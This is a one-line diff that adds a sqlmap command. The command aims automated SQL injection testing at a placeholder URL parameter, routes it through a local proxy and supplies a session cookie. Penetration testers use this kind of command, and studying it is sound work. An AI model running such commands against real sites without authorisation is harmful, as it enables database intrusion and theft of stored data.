@@ -1,0 +1,1 @@
+sqlmap -u 'http://example.com/vulnerable.php?id=1' --proxy='http://127.0.0.1:8080' --cookie='PHPSESSID=abcdef1234567890'
